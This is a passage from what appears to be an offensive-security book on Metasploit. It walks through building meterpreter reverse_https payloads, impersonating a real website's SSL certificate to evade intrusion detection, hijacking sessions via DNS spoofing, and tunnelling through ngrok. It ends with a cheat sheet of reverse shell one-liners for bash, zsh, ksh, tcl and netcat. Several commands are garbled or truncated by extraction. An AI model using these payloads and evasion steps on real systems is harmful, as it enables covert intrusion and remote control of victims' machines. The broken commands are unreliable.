> commands, we got an error message saying Unknown command. This is
> because the stager could
>
> not decrypt metsrv.dll in-memory. With the failed decryption, it could
> not perform reflective DLL injection to load itself in-memory. As a
> result, the session died after few seconds:
>
> ![](media/image332.jpeg)
>
> ![](media/image60.png)*If decryption fails, the stager executed on the
> target server will drain the resources (CPU and memory). So be extra
> careful when using reverse_tcp_rc4.*
>
> Instead of using a TCP based stager, metasploit also gives us the
> option to use a stage with SSL support. Enter reverse_https!
# reverse_https
> The reverse_tcp payload in Metasploit is a very powerful and basic
> payload but has its own drawbacks. One of the drawbacks is its
> non-encrypted nature for the second stage. However, Metasploit does
> have another payload with SSL support:
>
> reverse_https!
The reverse_https payload can be generated using the following command:
> ![](media/image334.jpeg)**msfvenom -p
> windows/meterpreter/reverse_https lhost=192.168.2.6 lport=8443 -f exe
> -o Sha**
Let\'s set up the handler for reverse_https as well, using the following
commands:
> **Set payload windows/meterpreter/reverse_https Set lhost
> 192.168.2.6**
>
> **Set lport 8443**
>
> **Set exitfunc thread**
>
> **Set exitonsession false run**
>
> ![](media/image335.jpeg)
>
> Our handler is up and running now. Let\'s execute the payload on the
> server and see the network packets flowing from the target server to
> our handler:
>
> ![](media/image336.jpeg)
Upon successful execution of the payload, the meterpreter session is
opened on the handler with the unique UUID for the session:
> ![](media/image337.jpeg)
Now we have a secure connection and no one can detect our presence
inside the organization, right? Wrong! Let\'s take a look at what the
problem could be with
> reverse_https:
>
> ![](media/image338.jpeg)
>
> Since reverse_https uses SSL, we need to decode these network packets
> as SSL.
>
> This can be achieved by opening the Analyze \| Decode As\... sub-menu,
> as follows:
>
> ![](media/image339.jpeg)
>
> The Decode-As\... display window will then open. We need to add the
> SSL option so that the packets displayed by Wireshark can be decoded
> into SSL packets. Clicking on the + sign will help us with this
> further:
>
> ![](media/image340.jpeg)
>
> A new field will be added on the display windows. Let\'s select the
> Field as TCP port, the Value as 8443, the Type as Integer, Base 10,
> the Default as (none) and the Current field as SSL:
>
> ![](media/image341.jpeg)
After clicking OK, we will see that the network packets have been
decoded into SSL:
> ![](media/image342.jpeg)
Now that we have decoded the SSL packets, let\'s search for the Server
Hello
> packet:
>
> ![](media/image343.jpeg)
>
> Looking into this, we can see that we have just found the default SSL
> certificate used by the reverse_https payload:
>
> ![](media/image344.jpeg)
Now let\'s open the handler\'s URI in the browser, as we can also find
this information there:
> ![](media/image345.jpeg)
Opening the link would send the client\'s user-agent and request to the
handler, as
> seen in the following screenshot:
>
> ![](media/image346.jpeg)
Let\'s look for the certificate information from the browser certificate
menu:
> ![](media/image347.jpeg)
>
> As we can see from preceding screenshot, the issuer doesn\'t exist;
> it\'s just a fake domain. IDS/IPS generally blocks the SSL requests if
> the issuer is not a valid one or if the SSL certificate is not CA
> authorized.
So, is there a solution to this problem? Yes, there is! We can use a
custom SSL certificate here.
# reverse_https with a custom SSL certificate
> This technique can be used in two ways:
>
> By getting an SSL certificate signed by CA (a genuine SSL certificate)
> By using someone else\'s SSL certificate (impersonation)
You can purchase a genuine SSL certificate from an authorized seller or
you can use services such as Let\'s Encrypt to get a genuine SSL
certificate for free.
> Otherwise, you can always impersonate someone else\'s SSL certificate.
> Metasploit really can help us with impersonation. There\'s a module in
> Metasploit that can do this for us. Execute the following command in
> order to use the impersonation module: **Use
> auxiliary/gather/impersonate_ssl**
>
> ![](media/image348.jpeg)
Set up the following options for SSL certificate impersonation:
> **set ADD_CN \*.packtpub.com**
>
> **set EXPIRATION \ set rhost
> [www.packtpub.com](http://www.packtpub.com/)**
>
> **set rport 443**
>
> ![](media/image349.jpeg)
>
> Let\'s run the module so that it can impersonate packtpub.com\'s SSL
> certificate:
>
> ![](media/image350.jpeg)
>
> Upon successful execution of this module, three files will be
> generated: the private key file (.key), the certificate (.crt) file,
> and the public certificate (.pem) file. We need to use the PEM file to
> generate our HTTPS payload using the impersonated SSL certificate.
> This can be achieved by executing the following command: **Msfvenom -p
> windows/memeterpreter/reverse_https lhost=192.168.2.6 lport=8443
> handlersslcert=\ stagerverifysslcert=true -f exe -o
> \**
>
> ![](media/image351.jpeg)
Let\'s set up the handler by executing the following command so that it
uses the impersonated SSL certificate:
> **Set payload windows/meterpreter/reverse_https Set
> stagerverifysslcert true**
>
> **Set handlersslcert \**
>
> ![](media/image352.jpeg)
Now let\'s run the handler:
> ![](media/image353.jpeg)
Upon successful payload execution, the handler will first verify the SSL
certificate with the SHA1 hash, and only after that will it send the
second stage:
> ![](media/image354.jpeg)
We can confirm the SSL certificate in Wireshark:
> ![](media/image355.jpeg)
>
> The SSL certificate used for communication is the impersonated one. We
> can also verify the SSL certificate in the browser:
>
> ![](media/image356.jpeg)
>
> Boom! We can now hack any organization using their SSL certificate but
> with a different key. This way, they won\'t be able to decrypt our
> communication or detect us.
>
> Now, how can we make this even more stealthy? (I know what you\'re
> thinking*: There\'s another level to this? Damn!*)
>
> Did you know meterpreter payloads can also be hijacked by someone
> else? Let\'s take a look at a hijacking scenario in which the payload
> used is reverse_tcp:
1.  The attacker backdoor-ed a server with a persistent meterpreter
    > service. However, for reasons such as gio-IP blocking, the DNS
    > server not working, and so on, the service is not able to connect
    > back to attacker\'s handler.
2.  Let\'s say we also want to get access to the server but we\'re
    > unable to.
3.  In this case, upon sniffing the DNS information from the network, we
    > found that the server is looking up a *weird* domain name.
4.  We also found that the domain doesn\'t exist and according to its
    > traits, we think that it could be a meterpreter stager trying to
    > connect back to the handler.
5.  How can we redirect this DNS lookup so that it points to our IP
    > address where we have already set up our handler for an incoming
    > connection?
6.  A DNS spoofing attack is the perfect attack in this scenario. We
    > perform this attack by hijacking the network DNS so that the
    > server, when looking for the original malicious domain from the
    > DNS, resolves to our handler IP.
7.  It\'s a piece of cake after this. The handler receives the incoming
    > connection and sends the stager.
8.  The meterpreter session hijack is complete!
> How can you prevent someone else from hijacking your session? Through
>
> **paranoid mode**!
>
> Paranoid mode is a special security feature provided by Metasploit.
> It\'s a normal reverse_winhttps payload with a custom SSL certificate
> that can verify the SSL certificate using SHA1 and can check the UUID
> from its payloads.json file to confirm whether or not the correct
> stager has been connected or not, ignoring all other payloads. For
> more information on paranoid mode, please refer to the following link:
> [https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-
> Mode](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode)
>
> We may face situations where we want the payload to connect back to us
> but we don\'t have a public-facing IP in which our handler can receive
> an incoming connection (in an office situation). In those cases, if we
> can\'t get access to the router to set up the port-forwarding option
> then what can we do?
# Meterpreter over ngrok
> According to its website (), ngrok is a secure
> introspectable tunnel to the localhost. This exposes local servers
> behind NATs and firewalls to the public internet over secure tunnels.
> So, how do we use ngrok?
>
> Let\'s start by registering to it:
>
> ![](media/image357.jpeg)
Upon successful registration, you\'ll get the required Tunnel Authtoken.
Let\'s copy this token:
> ![](media/image358.jpeg)
>
> ![](media/image359.jpeg)We downloaded the ngrok package for macOS and,
> after uncompressing it, we got a single executable file named ngrok:
>
> Let\'s first use our auth token so that whenever the tunnel is being
> created by this executable file, our auth token is used. We can do
> this by executing the following command: **./ngrok authtoken \ token\>**
>
> ![](media/image360.jpeg)
>
> Let\'s try to execute ngrok to bring up the help screen:
>
> ![](media/image361.jpeg)
>
> As we can see from preceding screenshot, ngrok supports TCP, HTTP, and
> TLS tunnel (TLS is only for premium users). Let\'s start the HTTP
> tunnel using the following command: **./ngrok http 8443**
>
> ![](media/image362.jpeg)
The HTTP tunnel is now up and running on port 8443:
> ![](media/image363.jpeg)
>
> Let\'s understand the line forwarding
> [http://c55867a0.ngrok.io](http://c55867a0.ngrok.io/) \|
> localhost:8443 via the following diagram:
>
> ![](media/image364.jpeg)
>
> This also means that any incoming HTTP connection to c55867.ngrok.io
> will be forwarded to the attacker\'s machine on port 8443/tcp.
>
> The web interface for ngrok can be opened on http://localhost:4040/:
>
> ![](media/image365.jpeg)
>
> We have the LHOST and LPORT for meterpreter connections. Let\'s set up
> the handler to accept the connections using the following commands:
> **Set payload windows/meterpreter/reverse_http Set lhost 0.0.0.0 Set
> lport 8443 Set exitfunc thread Exploit -j**
>
> ![](media/image366.jpeg)
Furthermore, let\'s generate the meterpreter payload that would connect
to the ngrok server. The ngrok server will automatically forward the
connection to our handler listening on port 8443:
> ![](media/image367.jpeg)
>
> Upon successful payload execution, you\'ll see a meterpreter session
> pop up:
>
> ![](media/image368.jpeg)
>
> Let\'s confirm the session using the sessions command:
>
> ![](media/image369.jpeg)
>
> Let\'s also interact with the session for further confirmation:
>
> ![](media/image370.jpeg)
>
> The session is stable and working perfectly. Thanks, ngrok!
Another good thing about using ngrok is the web interface. The interface
does so much more than displaying the status. We can see
connection-related information on this interface:
> ![](media/image371.jpeg)
We can also see the number of requests made to the ngrok server from
this interface:
> ![](media/image372.jpeg)
We can check the tunnel status from our ngrok dashboard:
> ![](media/image373.jpeg)
>
> This is a good technique that can be used once in a while, but *do
> not* depend on it for red-team operations. It\'s better to use your
> privately and anonymously owned VPS for this.
>
> Now for the bonus part! The following is the reverse shell cheat sheet
> that you can refer to whenever necessary. This covers anything from a
> normal Bash reverse shell to a lesser known Node Js reverse shell.
# Reverse shell cheat sheet
> Please use this carefully.
# Bash reverse shell
> A bash reverse shell one-liner command using custom file descriptor is
> as follows (it won\'t be a tty): **exec
> 100\/dev/tcp/192.168.2.6/8080 cat \ \$line 2\>&100 \>&100; done**
>
> Or:
>
> **while read line 0\&100 \>&100; done**
>
> A bash reverse shell one-liner command using bash\'s interactive mode
> is as follows:
>
> **bash -i \>& /dev/tcp/192.168.2.6/8080 0\>&1**
>
> In both cases, you can use /dev/tcp for TCP-based reverse shell and
> /dev/udp for UDP-based reverse shell. (For a UDP connection, use the
> -u switch with netcat to get the shell over UDP.)
>
> []{#_bookmark128 .anchor}\zmodload zsh/net/tcp;ztcp
> 192.168.2.6 8080;while read -r cmd
>
> \&\$REPLY;done;ztcp -c\
\zmodload zsh/net/tcp && ztcp -d 9 192.168.2.6 8080 && zsh
1\>&9 2\>&9 0\>&9\
# TCLsh/wish reverse shell
> **echo \'set s \[socket 192.168.2.6 8080\];while 100 { puts -nonewline
> \$s \"RevSh\>\";flush \$s;g**
# Ksh reverse shell
> **ksh -c \'ksh \>/dev/tcp/192.168.2.6/8080 0\>&1\'**
# Netcat reverse shell
> Without GAPING_SECURITY_HOLE (using mkfifo):
>
> **rm -f /tmp/a; mkfifo /tmp/a; nc 192.168.2.6 8080 0\ /bin/sh \>/tmp/a 2\>&1; rm /tm**
>
> Or using mknod:
>
> **rm -f /tmp/a; mknod /tmp/a p && nc 192.168.2.6 8080 0\ /bin/bash 1\>/tmp/a**
>
> With GAPING_SECURITY_HOLE:
>
> **nc 192.168.2.6 8080 -e /bin/sh**